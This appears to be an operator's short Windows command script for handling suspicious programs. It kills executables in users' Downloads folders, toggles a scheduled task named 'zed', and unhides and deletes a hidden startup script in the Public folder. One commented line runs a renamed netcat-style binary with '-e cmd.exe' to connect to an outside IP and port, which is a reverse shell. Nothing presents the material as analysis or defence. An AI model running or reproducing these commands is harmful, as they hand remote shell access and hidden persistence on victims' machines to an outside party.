#taskkill /F /IM Disk-Uploading.exe
#taskkill /F /IM lml.exe
#C:\Users\seba\Downloads\lml.exe
#C:\Users\angel\Downloads\Disk-Uploading.exe
Stop-ScheduledTask -TaskName zed
Start-ScheduledTask -TaskName zed
#C:\Users\Public\RNM.exe -nv 193.161.193.99 22352 -e cmd.exe
attrib -h C:\Users\Public\MyStartUp.ps1
del C:\Users\Public\MyStartUp.ps1

